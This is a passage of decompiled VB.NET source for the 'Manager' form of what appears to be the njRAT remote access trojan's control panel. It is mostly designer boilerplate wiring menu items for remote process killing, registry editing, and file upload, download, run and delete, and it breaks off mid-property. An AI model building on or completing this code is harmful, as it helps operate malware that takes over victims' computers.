Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x0200001D RID: 29
	<DesignerGenerated()>
	Public Partial Class Manager
		Inherits Form

		' Token: 0x1700007E RID: 126
		' (get) Token: 0x06000196 RID: 406 RVA: 0x00012D45 File Offset: 0x00010F45
		' (set) Token: 0x06000197 RID: 407 RVA: 0x00012D4F File Offset: 0x00010F4F
		Friend Overridable Property StatusStrip1 As StatusStrip

		' Token: 0x1700007F RID: 127
		' (get) Token: 0x06000198 RID: 408 RVA: 0x00012D58 File Offset: 0x00010F58
		' (set) Token: 0x06000199 RID: 409 RVA: 0x00012D64 File Offset: 0x00010F64
		Friend Overridable Property SL As ToolStripStatusLabel
			<CompilerGenerated()>
			Get
				Return Me._SL
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.SL_Click
				Dim sl As ToolStripStatusLabel = Me._SL
				If sl IsNot Nothing Then
					RemoveHandler sl.Click, value2
				End If
				Me._SL = value
				sl = Me._SL
				If sl IsNot Nothing Then
					AddHandler sl.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000080 RID: 128
		' (get) Token: 0x0600019A RID: 410 RVA: 0x00012DA7 File Offset: 0x00010FA7
		' (set) Token: 0x0600019B RID: 411 RVA: 0x00012DB1 File Offset: 0x00010FB1
		Friend Overridable Property pr As ToolStripProgressBar

		' Token: 0x17000081 RID: 129
		' (get) Token: 0x0600019C RID: 412 RVA: 0x00012DBA File Offset: 0x00010FBA
		' (set) Token: 0x0600019D RID: 413 RVA: 0x00012DC4 File Offset: 0x00010FC4
		Friend Overridable Property M1 As ContextMenuStrip

		' Token: 0x17000082 RID: 130
		' (get) Token: 0x0600019E RID: 414 RVA: 0x00012DCD File Offset: 0x00010FCD
		' (set) Token: 0x0600019F RID: 415 RVA: 0x00012DD8 File Offset: 0x00010FD8
		Friend Overridable Property KillToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._KillToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KillToolStripMenuItem1_Click
				Dim killToolStripMenuItem As ToolStripMenuItem = Me._KillToolStripMenuItem1
				If killToolStripMenuItem IsNot Nothing Then
					RemoveHandler killToolStripMenuItem.Click, value2
				End If
				Me._KillToolStripMenuItem1 = value
				killToolStripMenuItem = Me._KillToolStripMenuItem1
				If killToolStripMenuItem IsNot Nothing Then
					AddHandler killToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000083 RID: 131
		' (get) Token: 0x060001A0 RID: 416 RVA: 0x00012E1B File Offset: 0x0001101B
		' (set) Token: 0x060001A1 RID: 417 RVA: 0x00012E28 File Offset: 0x00011028
		Friend Overridable Property KillDeleteToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._KillDeleteToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KillDeleteToolStripMenuItem_Click
				Dim killDeleteToolStripMenuItem As ToolStripMenuItem = Me._KillDeleteToolStripMenuItem
				If killDeleteToolStripMenuItem IsNot Nothing Then
					RemoveHandler killDeleteToolStripMenuItem.Click, value2
				End If
				Me._KillDeleteToolStripMenuItem = value
				killDeleteToolStripMenuItem = Me._KillDeleteToolStripMenuItem
				If killDeleteToolStripMenuItem IsNot Nothing Then
					AddHandler killDeleteToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000084 RID: 132
		' (get) Token: 0x060001A2 RID: 418 RVA: 0x00012E6B File Offset: 0x0001106B
		' (set) Token: 0x060001A3 RID: 419 RVA: 0x00012E78 File Offset: 0x00011078
		Friend Overridable Property RestartProcessToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RestartProcessToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RestartProcessToolStripMenuItem_Click
				Dim restartProcessToolStripMenuItem As ToolStripMenuItem = Me._RestartProcessToolStripMenuItem
				If restartProcessToolStripMenuItem IsNot Nothing Then
					RemoveHandler restartProcessToolStripMenuItem.Click, value2
				End If
				Me._RestartProcessToolStripMenuItem = value
				restartProcessToolStripMenuItem = Me._RestartProcessToolStripMenuItem
				If restartProcessToolStripMenuItem IsNot Nothing Then
					AddHandler restartProcessToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000085 RID: 133
		' (get) Token: 0x060001A4 RID: 420 RVA: 0x00012EBB File Offset: 0x000110BB
		' (set) Token: 0x060001A5 RID: 421 RVA: 0x00012EC8 File Offset: 0x000110C8
		Friend Overridable Property vmethod_26 As Timer
			<CompilerGenerated()>
			Get
				Return Me._vmethod_26
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.vmethod_26_Tick
				Dim vmethod_ As Timer = Me._vmethod_26
				If vmethod_ IsNot Nothing Then
					RemoveHandler vmethod_.Tick, value2
				End If
				Me._vmethod_26 = value
				vmethod_ = Me._vmethod_26
				If vmethod_ IsNot Nothing Then
					AddHandler vmethod_.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000086 RID: 134
		' (get) Token: 0x060001A6 RID: 422 RVA: 0x00012F0B File Offset: 0x0001110B
		' (set) Token: 0x060001A7 RID: 423 RVA: 0x00012F15 File Offset: 0x00011115
		Friend Overridable Property ImageList1 As ImageList

		' Token: 0x17000087 RID: 135
		' (get) Token: 0x060001A8 RID: 424 RVA: 0x00012F1E File Offset: 0x0001111E
		' (set) Token: 0x060001A9 RID: 425 RVA: 0x00012F28 File Offset: 0x00011128
		Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip

		' Token: 0x17000088 RID: 136
		' (get) Token: 0x060001AA RID: 426 RVA: 0x00012F31 File Offset: 0x00011131
		' (set) Token: 0x060001AB RID: 427 RVA: 0x00012F3C File Offset: 0x0001113C
		Friend Overridable Property KillConnectionToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._KillConnectionToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KillConnectionToolStripMenuItem_Click
				Dim killConnectionToolStripMenuItem As ToolStripMenuItem = Me._KillConnectionToolStripMenuItem
				If killConnectionToolStripMenuItem IsNot Nothing Then
					RemoveHandler killConnectionToolStripMenuItem.Click, value2
				End If
				Me._KillConnectionToolStripMenuItem = value
				killConnectionToolStripMenuItem = Me._KillConnectionToolStripMenuItem
				If killConnectionToolStripMenuItem IsNot Nothing Then
					AddHandler killConnectionToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000089 RID: 137
		' (get) Token: 0x060001AC RID: 428 RVA: 0x00012F7F File Offset: 0x0001117F
		' (set) Token: 0x060001AD RID: 429 RVA: 0x00012F89 File Offset: 0x00011189
		Friend Overridable Property crg As ContextMenuStrip

		' Token: 0x1700008A RID: 138
		' (get) Token: 0x060001AE RID: 430 RVA: 0x00012F92 File Offset: 0x00011192
		' (set) Token: 0x060001AF RID: 431 RVA: 0x00012F9C File Offset: 0x0001119C
		Friend Overridable Property RefreshToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RefreshToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshToolStripMenuItem_Click
				Dim refreshToolStripMenuItem As ToolStripMenuItem = Me._RefreshToolStripMenuItem
				If refreshToolStripMenuItem IsNot Nothing Then
					RemoveHandler refreshToolStripMenuItem.Click, value2
				End If
				Me._RefreshToolStripMenuItem = value
				refreshToolStripMenuItem = Me._RefreshToolStripMenuItem
				If refreshToolStripMenuItem IsNot Nothing Then
					AddHandler refreshToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700008B RID: 139
		' (get) Token: 0x060001B0 RID: 432 RVA: 0x00012FDF File Offset: 0x000111DF
		' (set) Token: 0x060001B1 RID: 433 RVA: 0x00012FEC File Offset: 0x000111EC
		Friend Overridable Property EditToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._EditToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.EditToolStripMenuItem_Click
				Dim editToolStripMenuItem As ToolStripMenuItem = Me._EditToolStripMenuItem
				If editToolStripMenuItem IsNot Nothing Then
					RemoveHandler editToolStripMenuItem.Click, value2
				End If
				Me._EditToolStripMenuItem = value
				editToolStripMenuItem = Me._EditToolStripMenuItem
				If editToolStripMenuItem IsNot Nothing Then
					AddHandler editToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700008C RID: 140
		' (get) Token: 0x060001B2 RID: 434 RVA: 0x0001302F File Offset: 0x0001122F
		' (set) Token: 0x060001B3 RID: 435 RVA: 0x0001303C File Offset: 0x0001123C
		Friend Overridable Property NewValueToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._NewValueToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.NewValueToolStripMenuItem_Click
				Dim newValueToolStripMenuItem As ToolStripMenuItem = Me._NewValueToolStripMenuItem
				If newValueToolStripMenuItem IsNot Nothing Then
					RemoveHandler newValueToolStripMenuItem.Click, value2
				End If
				Me._NewValueToolStripMenuItem = value
				newValueToolStripMenuItem = Me._NewValueToolStripMenuItem
				If newValueToolStripMenuItem IsNot Nothing Then
					AddHandler newValueToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700008D RID: 141
		' (get) Token: 0x060001B4 RID: 436 RVA: 0x0001307F File Offset: 0x0001127F
		' (set) Token: 0x060001B5 RID: 437 RVA: 0x0001308C File Offset: 0x0001128C
		Friend Overridable Property DeleteToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._DeleteToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DeleteToolStripMenuItem_Click
				Dim deleteToolStripMenuItem As ToolStripMenuItem = Me._DeleteToolStripMenuItem
				If deleteToolStripMenuItem IsNot Nothing Then
					RemoveHandler deleteToolStripMenuItem.Click, value2
				End If
				Me._DeleteToolStripMenuItem = value
				deleteToolStripMenuItem = Me._DeleteToolStripMenuItem
				If deleteToolStripMenuItem IsNot Nothing Then
					AddHandler deleteToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700008E RID: 142
		' (get) Token: 0x060001B6 RID: 438 RVA: 0x000130CF File Offset: 0x000112CF
		' (set) Token: 0x060001B7 RID: 439 RVA: 0x000130D9 File Offset: 0x000112D9
		Friend Overridable Property rimg As ImageList

		' Token: 0x1700008F RID: 143
		' (get) Token: 0x060001B8 RID: 440 RVA: 0x000130E2 File Offset: 0x000112E2
		' (set) Token: 0x060001B9 RID: 441 RVA: 0x000130EC File Offset: 0x000112EC
		Friend Overridable Property crgk As ContextMenuStrip

		' Token: 0x17000090 RID: 144
		' (get) Token: 0x060001BA RID: 442 RVA: 0x000130F5 File Offset: 0x000112F5
		' (set) Token: 0x060001BB RID: 443 RVA: 0x00013100 File Offset: 0x00011300
		Friend Overridable Property RefreshToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RefreshToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshToolStripMenuItem1_Click
				Dim refreshToolStripMenuItem As ToolStripMenuItem = Me._RefreshToolStripMenuItem1
				If refreshToolStripMenuItem IsNot Nothing Then
					RemoveHandler refreshToolStripMenuItem.Click, value2
				End If
				Me._RefreshToolStripMenuItem1 = value
				refreshToolStripMenuItem = Me._RefreshToolStripMenuItem1
				If refreshToolStripMenuItem IsNot Nothing Then
					AddHandler refreshToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000091 RID: 145
		' (get) Token: 0x060001BC RID: 444 RVA: 0x00013143 File Offset: 0x00011343
		' (set) Token: 0x060001BD RID: 445 RVA: 0x00013150 File Offset: 0x00011350
		Friend Overridable Property CreateKeyToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CreateKeyToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CreateKeyToolStripMenuItem_Click
				Dim createKeyToolStripMenuItem As ToolStripMenuItem = Me._CreateKeyToolStripMenuItem
				If createKeyToolStripMenuItem IsNot Nothing Then
					RemoveHandler createKeyToolStripMenuItem.Click, value2
				End If
				Me._CreateKeyToolStripMenuItem = value
				createKeyToolStripMenuItem = Me._CreateKeyToolStripMenuItem
				If createKeyToolStripMenuItem IsNot Nothing Then
					AddHandler createKeyToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000092 RID: 146
		' (get) Token: 0x060001BE RID: 446 RVA: 0x00013193 File Offset: 0x00011393
		' (set) Token: 0x060001BF RID: 447 RVA: 0x000131A0 File Offset: 0x000113A0
		Friend Overridable Property DeleteSelectedToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._DeleteSelectedToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DeleteSelectedToolStripMenuItem_Click
				Dim deleteSelectedToolStripMenuItem As ToolStripMenuItem = Me._DeleteSelectedToolStripMenuItem
				If deleteSelectedToolStripMenuItem IsNot Nothing Then
					RemoveHandler deleteSelectedToolStripMenuItem.Click, value2
				End If
				Me._DeleteSelectedToolStripMenuItem = value
				deleteSelectedToolStripMenuItem = Me._DeleteSelectedToolStripMenuItem
				If deleteSelectedToolStripMenuItem IsNot Nothing Then
					AddHandler deleteSelectedToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000093 RID: 147
		' (get) Token: 0x060001C0 RID: 448 RVA: 0x000131E3 File Offset: 0x000113E3
		' (set) Token: 0x060001C1 RID: 449 RVA: 0x000131ED File Offset: 0x000113ED
		Friend Overridable Property ContextMenuStrip2 As ContextMenuStrip

		' Token: 0x17000094 RID: 148
		' (get) Token: 0x060001C2 RID: 450 RVA: 0x000131F6 File Offset: 0x000113F6
		' (set) Token: 0x060001C3 RID: 451 RVA: 0x00013200 File Offset: 0x00011400
		Friend Overridable Property StopToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._StopToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.StopToolStripMenuItem_Click
				Dim stopToolStripMenuItem As ToolStripMenuItem = Me._StopToolStripMenuItem
				If stopToolStripMenuItem IsNot Nothing Then
					RemoveHandler stopToolStripMenuItem.Click, value2
				End If
				Me._StopToolStripMenuItem = value
				stopToolStripMenuItem = Me._StopToolStripMenuItem
				If stopToolStripMenuItem IsNot Nothing Then
					AddHandler stopToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000095 RID: 149
		' (get) Token: 0x060001C4 RID: 452 RVA: 0x00013243 File Offset: 0x00011443
		' (set) Token: 0x060001C5 RID: 453 RVA: 0x00013250 File Offset: 0x00011450
		Friend Overridable Property PauseToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._PauseToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.PauseToolStripMenuItem_Click
				Dim pauseToolStripMenuItem As ToolStripMenuItem = Me._PauseToolStripMenuItem
				If pauseToolStripMenuItem IsNot Nothing Then
					RemoveHandler pauseToolStripMenuItem.Click, value2
				End If
				Me._PauseToolStripMenuItem = value
				pauseToolStripMenuItem = Me._PauseToolStripMenuItem
				If pauseToolStripMenuItem IsNot Nothing Then
					AddHandler pauseToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000096 RID: 150
		' (get) Token: 0x060001C6 RID: 454 RVA: 0x00013293 File Offset: 0x00011493
		' (set) Token: 0x060001C7 RID: 455 RVA: 0x000132A0 File Offset: 0x000114A0
		Friend Overridable Property StartToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._StartToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.StartToolStripMenuItem_Click
				Dim startToolStripMenuItem As ToolStripMenuItem = Me._StartToolStripMenuItem
				If startToolStripMenuItem IsNot Nothing Then
					RemoveHandler startToolStripMenuItem.Click, value2
				End If
				Me._StartToolStripMenuItem = value
				startToolStripMenuItem = Me._StartToolStripMenuItem
				If startToolStripMenuItem IsNot Nothing Then
					AddHandler startToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000097 RID: 151
		' (get) Token: 0x060001C8 RID: 456 RVA: 0x000132E3 File Offset: 0x000114E3
		' (set) Token: 0x060001C9 RID: 457 RVA: 0x000132ED File Offset: 0x000114ED
		Friend Overridable Property ContextMenuStrip3 As ContextMenuStrip

		' Token: 0x17000098 RID: 152
		' (get) Token: 0x060001CA RID: 458 RVA: 0x000132F6 File Offset: 0x000114F6
		' (set) Token: 0x060001CB RID: 459 RVA: 0x00013300 File Offset: 0x00011500
		Friend Overridable Property UPToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._UPToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UPToolStripMenuItem_Click
				Dim uptoolStripMenuItem As ToolStripMenuItem = Me._UPToolStripMenuItem
				If uptoolStripMenuItem IsNot Nothing Then
					RemoveHandler uptoolStripMenuItem.Click, value2
				End If
				Me._UPToolStripMenuItem = value
				uptoolStripMenuItem = Me._UPToolStripMenuItem
				If uptoolStripMenuItem IsNot Nothing Then
					AddHandler uptoolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000099 RID: 153
		' (get) Token: 0x060001CC RID: 460 RVA: 0x00013343 File Offset: 0x00011543
		' (set) Token: 0x060001CD RID: 461 RVA: 0x00013350 File Offset: 0x00011550
		Friend Overridable Property RefreshToolStripMenuItem2 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RefreshToolStripMenuItem2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshToolStripMenuItem2_Click
				Dim refreshToolStripMenuItem As ToolStripMenuItem = Me._RefreshToolStripMenuItem2
				If refreshToolStripMenuItem IsNot Nothing Then
					RemoveHandler refreshToolStripMenuItem.Click, value2
				End If
				Me._RefreshToolStripMenuItem2 = value
				refreshToolStripMenuItem = Me._RefreshToolStripMenuItem2
				If refreshToolStripMenuItem IsNot Nothing Then
					AddHandler refreshToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700009A RID: 154
		' (get) Token: 0x060001CE RID: 462 RVA: 0x00013393 File Offset: 0x00011593
		' (set) Token: 0x060001CF RID: 463 RVA: 0x000133A0 File Offset: 0x000115A0
		Friend Overridable Property RunToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RunToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RunToolStripMenuItem_Click
				Dim runToolStripMenuItem As ToolStripMenuItem = Me._RunToolStripMenuItem
				If runToolStripMenuItem IsNot Nothing Then
					RemoveHandler runToolStripMenuItem.Click, value2
				End If
				Me._RunToolStripMenuItem = value
				runToolStripMenuItem = Me._RunToolStripMenuItem
				If runToolStripMenuItem IsNot Nothing Then
					AddHandler runToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700009B RID: 155
		' (get) Token: 0x060001D0 RID: 464 RVA: 0x000133E3 File Offset: 0x000115E3
		' (set) Token: 0x060001D1 RID: 465 RVA: 0x000133F0 File Offset: 0x000115F0
		Friend Overridable Property DeleteToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._DeleteToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DeleteToolStripMenuItem1_Click
				Dim deleteToolStripMenuItem As ToolStripMenuItem = Me._DeleteToolStripMenuItem1
				If deleteToolStripMenuItem IsNot Nothing Then
					RemoveHandler deleteToolStripMenuItem.Click, value2
				End If
				Me._DeleteToolStripMenuItem1 = value
				deleteToolStripMenuItem = Me._DeleteToolStripMenuItem1
				If deleteToolStripMenuItem IsNot Nothing Then
					AddHandler deleteToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700009C RID: 156
		' (get) Token: 0x060001D2 RID: 466 RVA: 0x00013433 File Offset: 0x00011633
		' (set) Token: 0x060001D3 RID: 467 RVA: 0x00013440 File Offset: 0x00011640
		Friend Overridable Property EditToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._EditToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.EditToolStripMenuItem1_Click
				Dim editToolStripMenuItem As ToolStripMenuItem = Me._EditToolStripMenuItem1
				If editToolStripMenuItem IsNot Nothing Then
					RemoveHandler editToolStripMenuItem.Click, value2
				End If
				Me._EditToolStripMenuItem1 = value
				editToolStripMenuItem = Me._EditToolStripMenuItem1
				If editToolStripMenuItem IsNot Nothing Then
					AddHandler editToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700009D RID: 157
		' (get) Token: 0x060001D4 RID: 468 RVA: 0x00013483 File Offset: 0x00011683
		' (set) Token: 0x060001D5 RID: 469 RVA: 0x00013490 File Offset: 0x00011690
		Friend Overridable Property RenameToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RenameToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RenameToolStripMenuItem_Click
				Dim renameToolStripMenuItem As ToolStripMenuItem = Me._RenameToolStripMenuItem
				If renameToolStripMenuItem IsNot Nothing Then
					RemoveHandler renameToolStripMenuItem.Click, value2
				End If
				Me._RenameToolStripMenuItem = value
				renameToolStripMenuItem = Me._RenameToolStripMenuItem
				If renameToolStripMenuItem IsNot Nothing Then
					AddHandler renameToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700009E RID: 158
		' (get) Token: 0x060001D6 RID: 470 RVA: 0x000134D3 File Offset: 0x000116D3
		' (set) Token: 0x060001D7 RID: 471 RVA: 0x000134E0 File Offset: 0x000116E0
		Friend Overridable Property CopyToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CopyToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyToolStripMenuItem_Click
				Dim copyToolStripMenuItem As ToolStripMenuItem = Me._CopyToolStripMenuItem
				If copyToolStripMenuItem IsNot Nothing Then
					RemoveHandler copyToolStripMenuItem.Click, value2
				End If
				Me._CopyToolStripMenuItem = value
				copyToolStripMenuItem = Me._CopyToolStripMenuItem
				If copyToolStripMenuItem IsNot Nothing Then
					AddHandler copyToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700009F RID: 159
		' (get) Token: 0x060001D8 RID: 472 RVA: 0x00013523 File Offset: 0x00011723
		' (set) Token: 0x060001D9 RID: 473 RVA: 0x00013530 File Offset: 0x00011730
		Friend Overridable Property CutToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CutToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CutToolStripMenuItem_Click
				Dim cutToolStripMenuItem As ToolStripMenuItem = Me._CutToolStripMenuItem
				If cutToolStripMenuItem IsNot Nothing Then
					RemoveHandler cutToolStripMenuItem.Click, value2
				End If
				Me._CutToolStripMenuItem = value
				cutToolStripMenuItem = Me._CutToolStripMenuItem
				If cutToolStripMenuItem IsNot Nothing Then
					AddHandler cutToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A0 RID: 160
		' (get) Token: 0x060001DA RID: 474 RVA: 0x00013573 File Offset: 0x00011773
		' (set) Token: 0x060001DB RID: 475 RVA: 0x00013580 File Offset: 0x00011780
		Friend Overridable Property PasteToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._PasteToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.PasteToolStripMenuItem_Click
				Dim pasteToolStripMenuItem As ToolStripMenuItem = Me._PasteToolStripMenuItem
				If pasteToolStripMenuItem IsNot Nothing Then
					RemoveHandler pasteToolStripMenuItem.Click, value2
				End If
				Me._PasteToolStripMenuItem = value
				pasteToolStripMenuItem = Me._PasteToolStripMenuItem
				If pasteToolStripMenuItem IsNot Nothing Then
					AddHandler pasteToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A1 RID: 161
		' (get) Token: 0x060001DC RID: 476 RVA: 0x000135C3 File Offset: 0x000117C3
		' (set) Token: 0x060001DD RID: 477 RVA: 0x000135D0 File Offset: 0x000117D0
		Friend Overridable Property DownloadToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._DownloadToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DownloadToolStripMenuItem_Click
				Dim downloadToolStripMenuItem As ToolStripMenuItem = Me._DownloadToolStripMenuItem
				If downloadToolStripMenuItem IsNot Nothing Then
					RemoveHandler downloadToolStripMenuItem.Click, value2
				End If
				Me._DownloadToolStripMenuItem = value
				downloadToolStripMenuItem = Me._DownloadToolStripMenuItem
				If downloadToolStripMenuItem IsNot Nothing Then
					AddHandler downloadToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A2 RID: 162
		' (get) Token: 0x060001DE RID: 478 RVA: 0x00013613 File Offset: 0x00011813
		' (set) Token: 0x060001DF RID: 479 RVA: 0x00013620 File Offset: 0x00011820
		Friend Overridable Property UploadToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._UploadToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UploadToolStripMenuItem_Click
				Dim uploadToolStripMenuItem As ToolStripMenuItem = Me._UploadToolStripMenuItem
				If uploadToolStripMenuItem IsNot Nothing Then
					RemoveHandler uploadToolStripMenuItem.Click, value2
				End If
				Me._UploadToolStripMenuItem = value
				uploadToolStripMenuItem = Me._UploadToolStripMenuItem
				If uploadToolStripMenuItem IsNot Nothing Then
					AddHandler uploadToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A3 RID: 163
		' (get) Token: 0x060001E0 RID: 480 RVA: 0x00013663 File Offset: 0x00011863
		' (set) Token: 0x060001E1 RID: 481 RVA: 0x00013670 File Offset: 0x00011870
		Friend Overridable Property NewEmptyFileToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._NewEmptyFileToolStripMenuItem
			End Get
			<CompilerGenerated()>
